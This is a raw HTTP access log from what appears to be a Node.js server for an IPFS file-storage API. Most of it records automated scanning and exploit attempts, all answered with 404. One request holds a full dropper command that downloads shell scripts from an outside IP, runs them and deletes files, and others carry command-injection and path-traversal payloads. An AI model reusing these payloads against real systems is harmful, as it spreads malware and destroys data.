[0mGET / [33m404 [0m0.227 ms - 139[0m
[0mGET /manager/html [33m404 [0m0.275 ms - 151[0m
[0mPOST http://check.best-proxies.ru/azenv.php?s=158359371319515PC265009540608080 [33m404 [0m0.180 ms - 149[0m
[0mGET / [33m404 [0m0.207 ms - 139[0m
[0mGET /manager/html [33m404 [0m0.208 ms - 151[0m
[0mHEAD http://112.124.42.80:63435/ [33m404 [0m0.262 ms - 140[0m
[0mGET /manager/html [33m404 [0m0.417 ms - 151[0m
[0mGET /manager/html [33m404 [0m0.437 ms - 151[0m
[0mPOST http://check.best-proxies.ru/azenv.php?s=158360810449457PC265009540608080 [33m404 [0m0.314 ms - 149[0m
[0mPOST http://check.proxyradar.com/azenv.php?auth=158360842055&a=PSCMN&i=2650095406&p=8080 [33m404 [0m0.246 ms - 149[0m
[0mGET http://weibo.com/ [33m404 [0m0.361 ms - 139[0m
[0mGET / [33m404 [0m0.251 ms - 139[0m
[0mGET http://js.sogou.com/pv_sogou.js [33m404 [0m0.574 ms - 150[0m
[0mGET /manager/html [33m404 [0m1.474 ms - 151[0m
[0mGET / [33m404 [0m0.446 ms - 139[0m
[0mGET /login?from=%2F [33m404 [0m0.304 ms - 144[0m
[0mGET /manager/html [33m404 [0m0.416 ms - 151[0m
[0mPOST http://check.best-proxies.ru/azenv.php?s=158362250447257PC265009540608080 [33m404 [0m0.419 ms - 149[0m
[0mPOST http://check.proxyradar.com/azenv.php?auth=158362399199&a=PSCMN&i=2650095406&p=8080 [33m404 [0m0.299 ms - 149[0m
[0mGET / [33m404 [0m0.231 ms - 139[0m
[0mGET / [33m404 [0m0.321 ms - 139[0m
[0mGET /manager/html [33m404 [0m0.312 ms - 151[0m
[0mGET /manager/html [33m404 [0m0.242 ms - 151[0m
[0mGET / [33m404 [0m0.389 ms - 139[0m
[0mGET / [33m404 [0m0.372 ms - 139[0m
[0mGET http://httpheader.net/ [33m404 [0m0.341 ms - 139[0m
[0mGET / [33m404 [0m0.373 ms - 139[0m
[0mPOST /GponForm/diag_Form?images/ [33m404 [0m0.645 ms - 158[0m
[0mGET / [33m404 [0m0.443 ms - 139[0m
[0mPOST http://check.best-proxies.ru/azenv.php?s=158363687819716PC265009540608080 [33m404 [0m0.240 ms - 149[0m
[0mGET http://110.249.212.46/testget?q=23333&port=8080 [33m404 [0m0.535 ms - 146[0m
[0mGET http://110.249.212.46/testget?q=23333&port=8080 [33m404 [0m0.318 ms - 146[0m
[0mGET http://110.249.212.46/testget?q=23333&port=8080 [33m404 [0m0.550 ms - 146[0m
[0mGET http://110.249.212.46/testget?q=23333&port=8080 [33m404 [0m0.292 ms - 146[0m
[0mGET http://110.249.212.46/testget?q=23333&port=8080 [33m404 [0m0.494 ms - 146[0m
[0mGET /manager/html [33m404 [0m0.249 ms - 151[0m
[0mPOST http://check.proxyradar.com/azenv.php?auth=158363952609&a=PSCMN&i=2650095406&p=8080 [33m404 [0m0.273 ms - 149[0m
[0mGET / [33m404 [0m0.219 ms - 139[0m
[0mGET /manager/html [33m404 [0m0.344 ms - 151[0m
[0mGET / [33m404 [0m0.522 ms - 139[0m
[0mGET /manager/html [33m404 [0m0.411 ms - 151[0m
[0mPOST http://check.best-proxies.ru/azenv.php?s=158365127275349PC265009540608080 [33m404 [0m0.207 ms - 149[0m
[0mGET / [33m404 [0m0.264 ms - 139[0m
[0mGET / [33m404 [0m0.237 ms - 139[0m
[0mPOST http://check.proxyradar.com/azenv.php?auth=158365485815&a=PSCMN&i=2650095406&p=8080 [33m404 [0m0.223 ms - 149[0m
[0mGET / [33m404 [0m0.322 ms - 139[0m
[0mGET / [33m404 [0m0.251 ms - 139[0m
[0mGET /manager/html [33m404 [0m0.223 ms - 151[0m
[0mGET / [33m404 [0m0.445 ms - 139[0m
[0mGET /manager/html [33m404 [0m0.363 ms - 151[0m
[0mGET /manager/html [33m404 [0m0.242 ms - 151[0m
[0mGET / [33m404 [0m0.278 ms - 139[0m
[0mGET /TP/public/index.php [33m404 [0m0.299 ms - 158[0m
[0mGET /TP/index.php [33m404 [0m0.325 ms - 151[0m
[0mGET /thinkphp/html/public/index.php [33m404 [0m0.262 ms - 169[0m
[0mGET /html/public/index.php [33m404 [0m0.210 ms - 160[0m
[0mGET /public/index.php [33m404 [0m0.346 ms - 155[0m
[0mGET /TP/html/public/index.php [33m404 [0m0.315 ms - 163[0m
[0mGET /elrekt.php [33m404 [0m0.165 ms - 149[0m
[0mGET /index.php [33m404 [0m0.558 ms - 148[0m
[0mPOST /users?page=&size=5 [33m404 [0m0.166 ms - 145[0m
[0mGET / [33m404 [0m0.242 ms - 139[0m
[0mPOST http://check.best-proxies.ru/azenv.php?s=158366567211735PC265009540608080 [33m404 [0m0.216 ms - 149[0m
[0mGET /hudson [33m404 [0m0.325 ms - 145[0m
[0mGET /manager/html [33m404 [0m0.251 ms - 151[0m
[0mPOST http://check.proxyradar.com/azenv.php?auth=158367044173&a=PSCMN&i=2650095406&p=8080 [33m404 [0m0.197 ms - 149[0m
[0mGET / [33m404 [0m0.250 ms - 139[0m
[0mGET /manager/html [33m404 [0m0.257 ms - 151[0m
[0mGET / [33m404 [0m0.927 ms - 139[0m
[0mPOST http://check.best-proxies.ru/azenv.php?s=158368006467906PC265009540608080 [33m404 [0m0.348 ms - 149[0m
[0mGET / [33m404 [0m0.298 ms - 139[0m
[0mGET /manager/html [33m404 [0m0.294 ms - 151[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=busybox&curpath=/&currentsetting.htm=1 [33m404 [0m0.358 ms - 148[0m
[0mPOST http://check.proxyradar.com/azenv.php?auth=158368612697&a=PSCMN&i=2650095406&p=8080 [33m404 [0m0.235 ms - 149[0m
[0mGET /manager/html [33m404 [0m0.294 ms - 151[0m
[0mGET / [33m404 [0m0.461 ms - 139[0m
[0mGET / [33m404 [0m0.351 ms - 139[0m
[0mPOST /.%0d./.%0d./.%0d./.%0d./bin/sh [33m404 [0m0.597 ms - 170[0m
[0mPOST http://check.best-proxies.ru/azenv.php?s=158369446211459PC265009540608080 [33m404 [0m0.400 ms - 149[0m
[0mGET /manager/html [33m404 [0m0.239 ms - 151[0m
[0mPOST http://check.proxyradar.com/azenv.php?auth=158370190057&a=PSCMN&i=2650095406&p=8080 [33m404 [0m0.274 ms - 149[0m
[0mGET /manager/html [33m404 [0m0.325 ms - 151[0m
[0mGET / [33m404 [0m0.295 ms - 139[0m
[0mGET / [33m404 [0m0.318 ms - 139[0m
[0mGET /manager/html [33m404 [0m0.241 ms - 151[0m
[0mPOST http://check.best-proxies.ru/azenv.php?s=158370886609128PC265009540608080 [33m404 [0m0.380 ms - 149[0m
[0mGET / [33m404 [0m0.211 ms - 139[0m
[0mGET /manager/html [33m404 [0m0.263 ms - 151[0m
[0mGET http://httpheader.net/ [33m404 [0m0.335 ms - 139[0m
[0mPOST http://check.proxyradar.com/azenv.php?auth=158371733699&a=PSCMN&i=2650095406&p=8080 [33m404 [0m0.162 ms - 149[0m
[0mGET / [33m404 [0m0.266 ms - 139[0m
[0mGET / [33m404 [0m0.247 ms - 139[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=busybox&curpath=/&currentsetting.htm=1 [33m404 [0m0.341 ms - 148[0m
[0mGET /manager/html [33m404 [0m0.210 ms - 151[0m
[0mGET / [33m404 [0m0.231 ms - 139[0m
[0mGET /manager/html [33m404 [0m0.195 ms - 151[0m
[0mGET / [33m404 [0m0.235 ms - 139[0m
[0mGET http://5.188.210.101/echo.php [33m404 [0m0.470 ms - 147[0m
[0mGET /%73%65%65%79%6F%6E/%68%74%6D%6C%6F%66%66%69%63%65%73%65%72%76%6C%65%74 [33m404 [0m0.231 ms - 209[0m
[0mGET /secure/ContactAdministrators!default.jspa [33m404 [0m0.285 ms - 180[0m
[0mGET /weaver/bsh.servlet.BshServlet [33m404 [0m0.333 ms - 168[0m
[0mGET /solr/ [33m404 [0m0.279 ms - 144[0m
[0mGET /manager/html [33m404 [0m0.296 ms - 151[0m
[0mGET / [33m404 [0m0.240 ms - 139[0m
[0mPOST http://check.best-proxies.ru/azenv.php?s=158372326677362PC265009540608080 [33m404 [0m0.191 ms - 149[0m
[0mGET / [33m404 [0m0.203 ms - 139[0m
[0mGET / [33m404 [0m0.201 ms - 139[0m
[0mGET /manager/html [33m404 [0m0.268 ms - 151[0m
[0mGET / [33m404 [0m0.226 ms - 139[0m
[0mPOST http://check.proxyradar.com/azenv.php?auth=158373306989&a=PSCMN&i=2650095406&p=8080 [33m404 [0m0.213 ms - 149[0m
[0mGET /manager/html [33m404 [0m0.211 ms - 151[0m
[0mGET / [33m404 [0m0.222 ms - 139[0m
[0mGET /manager/text/list [33m404 [0m0.273 ms - 156[0m
[0mPOST http://check.best-proxies.ru/azenv.php?s=158373766625747PC265009540608080 [33m404 [0m0.197 ms - 149[0m
[0mGET / [33m404 [0m0.500 ms - 139[0m
[0mGET http://men.163.com/ [33m404 [0m0.222 ms - 139[0m
[0mGET /manager/html [33m404 [0m0.264 ms - 151[0m
[0mGET / [33m404 [0m0.276 ms - 139[0m
[0mGET http://www.sina.com.cn/ [33m404 [0m0.262 ms - 139[0m
[0mGET / [33m404 [0m0.272 ms - 139[0m
[0mGET / [33m404 [0m0.228 ms - 139[0m
[0mGET / [33m404 [0m0.230 ms - 139[0m
[0mGET /manager/html [33m404 [0m0.363 ms - 151[0m
[0mPOST http://check.proxyradar.com/azenv.php?auth=158374864315&a=PSCMN&i=2650095406&p=8080 [33m404 [0m0.273 ms - 149[0m
[0mGET / [33m404 [0m0.233 ms - 139[0m
[0mGET / [33m404 [0m0.319 ms - 139[0m
[0mPOST http://check.best-proxies.ru/azenv.php?s=158375206583128PC265009540608080 [33m404 [0m0.167 ms - 149[0m
[0mGET /manager/html [33m404 [0m0.319 ms - 151[0m
[0mGET http://jingsuan.baidu.com/ [33m404 [0m0.332 ms - 139[0m
[0mGET /hudson [33m404 [0m0.246 ms - 145[0m
[0mGET /shell?cd%20/tmp%20%7C%7C%20cd%20/run%20%7C%7C%20cd%20/;%20wget%20http://93.126.60.99/axisbins.sh;%20chmod%20777%20axisbins.sh;%20sh%20axisbins.sh;%20tftp%2093.126.60.99%20-c%20get%20axistftp1.sh;%20chmod%20777%20axistftp1.sh;%20sh%20axistftp1.sh;%20tftp%20-r%20axistftp2.sh%20-g%2093.126.60.99;%20chmod%20777%20axistftp2.sh;%20sh%20axistftp2.sh;%20rm%20-rf%20axisbins.sh%20axistftp1.sh%20axistftp2.sh;%20rm%20-rf%20* [33m404 [0m0.381 ms - 144[0m
[0mGET /manager/html [33m404 [0m0.317 ms - 151[0m
[0mGET / [33m404 [0m0.275 ms - 139[0m
[0mPOST http://check.proxyradar.com/azenv.php?auth=158376433295&a=PSCMN&i=2650095406&p=8080 [33m404 [0m0.159 ms - 149[0m
[0mPOST http://check.best-proxies.ru/azenv.php?s=158376646519194PC265009540608080 [33m404 [0m0.194 ms - 149[0m
[0mGET /manager/html [33m404 [0m0.251 ms - 151[0m
[0mGET /manager/html [33m404 [0m0.301 ms - 151[0m
[0mGET / [33m404 [0m0.316 ms - 139[0m
[0mGET /manager/html [33m404 [0m0.234 ms - 151[0m
[0mGET / [33m404 [0m0.246 ms - 139[0m
[0mGET / [33m404 [0m0.280 ms - 139[0m
[0mGET / [33m404 [0m0.229 ms - 139[0m
[0mPOST http://check.proxyradar.com/azenv.php?auth=158377997173&a=PSCMN&i=2650095406&p=8080 [33m404 [0m0.475 ms - 149[0m
[0mGET /manager/html [33m404 [0m0.218 ms - 151[0m
[0mPOST http://check.best-proxies.ru/azenv.php?s=158378087115387PC265009540608080 [33m404 [0m0.162 ms - 149[0m
[0mGET /script [33m404 [0m0.198 ms - 145[0m
[0mGET /manager/html [33m404 [0m0.229 ms - 151[0m
[0mGET /manager/html [33m404 [0m0.571 ms - 151[0m
[0mGET / [33m404 [0m0.220 ms - 139[0m
[0mGET /script [33m404 [0m0.275 ms - 145[0m
[0mGET / [33m404 [0m0.242 ms - 139[0m
[0mGET / [33m404 [0m0.208 ms - 139[0m
[0mGET /manager/html [33m404 [0m0.402 ms - 151[0m
[0mPOST http://check.best-proxies.ru/azenv.php?s=158379526635964PC265009540608080 [33m404 [0m0.147 ms - 149[0m
[0mGET / [33m404 [0m0.329 ms - 139[0m
[0mPOST http://check.proxyradar.com/azenv.php?auth=158379584857&a=PSCMN&i=2650095406&p=8080 [33m404 [0m0.208 ms - 149[0m
[0mGET / [33m404 [0m0.547 ms - 139[0m
[0mGET / [33m404 [0m0.318 ms - 139[0m
[0mGET /script [33m404 [0m0.223 ms - 145[0m
[0mGET /manager/html [33m404 [0m0.219 ms - 151[0m
[0mGET /manager/html [33m404 [0m0.302 ms - 151[0m
[0mPOST http://check.best-proxies.ru/azenv.php?s=158380966511866PC265009540608080 [33m404 [0m0.244 ms - 149[0m
[0mGET /script [33m404 [0m0.269 ms - 145[0m
[0mPOST http://check.proxyradar.com/azenv.php?auth=158381179399&a=PSCMN&i=2650095406&p=8080 [33m404 [0m0.197 ms - 149[0m
[0mGET /manager/html [33m404 [0m0.236 ms - 151[0m
[0mGET / [33m404 [0m0.287 ms - 139[0m
[0mGET / [33m404 [0m0.249 ms - 139[0m
[0mGET / [33m404 [0m0.235 ms - 139[0m
[0mGET / [33m404 [0m0.205 ms - 139[0m
[0mGET /script [33m404 [0m0.448 ms - 145[0m
[0mGET / [33m404 [0m0.250 ms - 139[0m
[0mGET /HNAP1/ [33m404 [0m0.268 ms - 145[0m
[0mGET /manager/html [33m404 [0m0.489 ms - 151[0m
[0mGET http://110.249.212.46/testget?q=23333&port=8080 [33m404 [0m0.286 ms - 146[0m
[0mGET http://110.249.212.46/testget?q=23333&port=8080 [33m404 [0m0.296 ms - 146[0m
[0mGET http://110.249.212.46/testget?q=23333&port=8080 [33m404 [0m0.356 ms - 146[0m
[0mGET http://110.249.212.46/testget?q=23333&port=8080 [33m404 [0m0.381 ms - 146[0m
[0mPOST http://check.best-proxies.ru/azenv.php?s=158382406669483PC265009540608080 [33m404 [0m0.188 ms - 149[0m
[0mGET http://www.apali.com/?rands=_561416888568151005625712 [33m404 [0m0.288 ms - 139[0m
[0mGET http://m.baidu.com/?rands=_1989640480017599084843872 [33m404 [0m0.374 ms - 139[0m
[0mGET /manager/html [33m404 [0m0.254 ms - 151[0m
[0mGET /script [33m404 [0m0.207 ms - 145[0m
[0mPOST http://check.proxyradar.com/azenv.php?auth=158382735605&a=PSCMN&i=2650095406&p=8080 [33m404 [0m0.269 ms - 149[0m
[0mGET /admin-scripts.asp [33m404 [0m0.290 ms - 156[0m
[0mGET /admin-scripts.asp [33m404 [0m0.367 ms - 156[0m
[0mGET /manager/html [33m404 [0m0.257 ms - 151[0m
[0mGET / [33m404 [0m0.306 ms - 139[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.112 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [33m401 [0m6.328 ms - -[0m
[0mOPTIONS /api/auth/protected [32m204 [0m0.134 ms - 0[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.139 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [33m401 [0m0.569 ms - -[0m
[0mGET /api/auth/protected [33m401 [0m1.687 ms - -[0m
[0mOPTIONS /api/auth/login [32m204 [0m0.132 ms - 0[0m
[0mPOST /api/auth/login [32m200 [0m53.217 ms - 412[0m
[0mOPTIONS /api/ipfsnode/getipfsconfig [32m204 [0m0.096 ms - 0[0m
[0mPOST /api/ipfsnode/getipfsconfig [32m200 [0m2.984 ms - 362[0m
[0mOPTIONS /api/ipfsusage/savefile [32m204 [0m0.160 ms - 0[0m
[0mPOST /api/ipfsusage/savefile [32m200 [0m25.197 ms - 339[0m
[0mOPTIONS /api/ipfsusage/savefile [32m204 [0m0.113 ms - 0[0m
[0mPOST /api/ipfsusage/savefile [32m200 [0m2.095 ms - 345[0m
[0mGET /script [33m404 [0m0.202 ms - 145[0m
